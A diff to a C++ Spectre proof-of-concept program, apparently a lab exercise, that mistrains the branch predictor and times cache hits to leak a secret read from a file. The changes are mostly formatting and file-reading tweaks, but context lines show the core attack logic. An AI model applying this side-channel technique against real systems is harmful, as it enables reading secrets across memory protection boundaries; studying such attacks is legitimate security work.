@@ -47,9 +47,9 @@ Attacking Program
 const int CACHE_HIT_THRESHOLD = 80; // Assume that the memory address is in Cache, if time is <= CACHE_HIT_THRESHOLD
 const int IMP_TRIES = 100;
 int NUM_TRIES = IMP_TRIES;
-const int NORMAL_TRIES = 100;               // The task of attacking and analysing is done NUM_TRIES times, then score is prepared for each character out of NUM_TRIES
-const int TRAINING_LOOPS = 30;              //The number of training loops (mistraing loops + attacking loops)
-const int ATTACK_LEAP = 5;                  // 1 in every ATTACK_LEAP of the TRAINING_LOOPS will be an attacking loop i.e. mistraining_loops = (TRAINING_LOOPS)/ATTACK_LEAP
+const int NORMAL_TRIES = 100;                // The task of attacking and analysing is done NUM_TRIES times, then score is prepared for each character out of NUM_TRIES
+const int TRAINING_LOOPS = 30;               //The number of training loops (mistraing loops + attacking loops)
+const int ATTACK_LEAP = 5;                   // 1 in every ATTACK_LEAP of the TRAINING_LOOPS will be an attacking loop i.e. mistraining_loops = (TRAINING_LOOPS)/ATTACK_LEAP
 const int INBETWEEN_DELAY = 100;             // The number of delay cycles between successive training loops
 int LIKELY_THRESHOLD = int(0.6 * NUM_TRIES); // I assume that the characters with more than 70% hit rate are in the SECRET
 int ATTACK_PATTERN[256];                     // Instead of going in sequence of ascii characters A -> B -> C -> D ... , I have randomized the attack pattern likeidx -> C -> A -> M ... (random)
@@ -91,7 +91,7 @@ void init_attack()
 */
 void readMemoryByte(size_t target_idx)
 {
-    int i, j, k, curr_char;
+    int i, j, curr_char;
     unsigned int junk = 0;
     size_t train_idx, idx;
     uint64_t time1, time_diff;
@@ -148,8 +148,13 @@ int main()
 {
     freopen("spectre_output.txt", "w", stdout);
     ifstream ifs("encodedImg.bin");
-    getline(ifs, secret, (char)ifs.eof());
-    // cin >> secret;
+    if (ifs)
+    {
+        ostringstream ss;
+        ss << ifs.rdbuf(); // reading databuffer
+        secret = ss.str();
+    }
+    
     //string.c_str gives the character address (in C type strings) of string
     size_t target_idx = (size_t)(secret.c_str() - (char *)arr1); /* Its value is the difference in the address of SECRET KEY and arr1*/
     /* So that when branch predictor fetches arr[target_idx] in attacking iterations (mispredictions), it prefetches arr1 + target_idx, which leads to prefetching of SECRET KEY in the cache memory */
@@ -175,7 +180,8 @@ int main()
         {
             int curr_char = PQ.top();
             PQ.pop();
-            if(curr_char > 128) continue;
+            if (curr_char > 128)
+                continue;
 
             // Update the mostly likely character if it is still unset
             if (most_likely_char == '?')
@@ -183,7 +189,8 @@ int main()
         }
 
         cout << int(most_likely_char) << " ";
-        if(counter % 10 == 0)
+        //flush after every 10 characters, this should be commented for better performance
+        if (counter % 10 == 0) 
             cout << flush;
         ++counter;
     }
